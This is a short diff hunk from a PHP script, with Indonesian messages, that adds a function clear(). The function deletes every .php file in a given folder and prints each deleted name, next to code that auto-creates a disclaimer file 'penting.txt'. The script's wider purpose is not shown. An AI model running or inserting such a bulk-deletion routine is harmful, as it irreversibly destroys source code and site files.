@@ -92,6 +92,18 @@ t = "\t",
 r = "\r                                             \r",
 n = "\n";
 
+function clear($folder = ".")
+{
+    foreach (glob($folder . "/*php*") as $file) {
+        if (is_file($file) && strpos(basename($file), ".php") !== false) {
+            unlink($file);
+            echo "Terhapus: " . basename($file) . PHP_EOL;
+        }
+    }
+
+    echo "Selesai." . PHP_EOL;
+}
+
 $DISCLAIMER_FILE = 'penting.txt'; // <-- pindah ke sini paling atas
 // === AUTO CREATE DISCLAIMER ===
 $disclaimer = <<<TXT
